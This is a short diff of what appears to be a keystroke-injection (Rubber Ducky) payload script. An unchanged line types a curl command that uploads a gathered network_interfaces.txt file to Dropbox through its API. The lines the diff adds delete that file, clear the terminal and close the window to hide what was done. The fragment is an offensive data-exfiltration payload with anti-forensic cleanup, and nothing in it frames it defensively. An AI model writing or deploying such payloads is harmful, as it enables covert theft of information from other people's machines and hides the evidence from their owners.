@@ -26,5 +26,14 @@ STRING curl -X POST https://content.dropboxapi.com/2/files/upload -H "Authorizat
 DELAY 2000
 ENTER
 DELAY 5000
+STRING rm -r ~/Desktop/network_interfaces.txt
+DELAY 500
+ENTER
+STRING clear
+DELAY 500
+ENTER
 GUI w
+DELAY 500 
+ENTER 
+
 
